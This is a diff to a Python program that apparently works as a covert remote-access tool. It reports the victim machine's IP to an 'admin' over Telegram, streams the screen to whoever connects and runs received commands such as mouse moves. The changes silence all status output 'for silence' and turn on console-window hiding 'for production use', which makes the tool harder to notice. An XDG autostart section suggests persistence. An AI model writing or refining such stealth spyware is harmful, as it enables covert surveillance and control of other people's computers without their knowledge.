@@ -144,6 +144,7 @@ def notify_admin():
         f"To connect, use:\n/connect {client_id}:{local_ip}:{CLIENT_PORT}"
     )
     
+    # print(f"Notifying admin: {message}") # Commented out for silence
     send_telegram_message(message)
 
 def start_server():
@@ -161,13 +162,13 @@ def start_server():
         # Notify admin
         notify_admin()
         
-        print(f"Listening for admin connection on port {CLIENT_PORT}")
+        # print(f"Listening for admin connection on port {CLIENT_PORT}") # Commented out for silence
         
         # Wait for admin to connect
         while running:
             try:
                 client_socket, addr = server_socket.accept()
-                print(f"Admin connected from {addr}")
+                # print(f"Admin connected from {addr}") # Commented out for silence
                 
                 # Start sending screen updates
                 screen_thread = threading.Thread(target=send_screen_continuously, args=(client_socket,), daemon=True)
@@ -194,7 +195,7 @@ def handle_admin_commands(socket_conn):
             if not command:
                 break
                 
-            print(f"Received command: {command}")  # Debug output
+            # print(f"Received command: {command}")  # Commented out for silence
             
             try:
                 if command.startswith('move'):
@@ -243,7 +244,7 @@ def handle_admin_commands(socket_conn):
             print(f"Error handling command: {e}")
             break
     
-    print("Admin disconnected")
+    # print("Admin disconnected") # Commented out for silence
 
 def hide_console_window():
     """Hide the console window on Windows."""
@@ -294,7 +295,7 @@ X-GNOME-Autostart-enabled=true
 
 def main():
     # Hide console window
-    # hide_console_window()  # Uncomment this for production use
+    hide_console_window()  # Uncommented for production use
     
     # Add to startup (uncomment to enable)
     # add_to_startup()
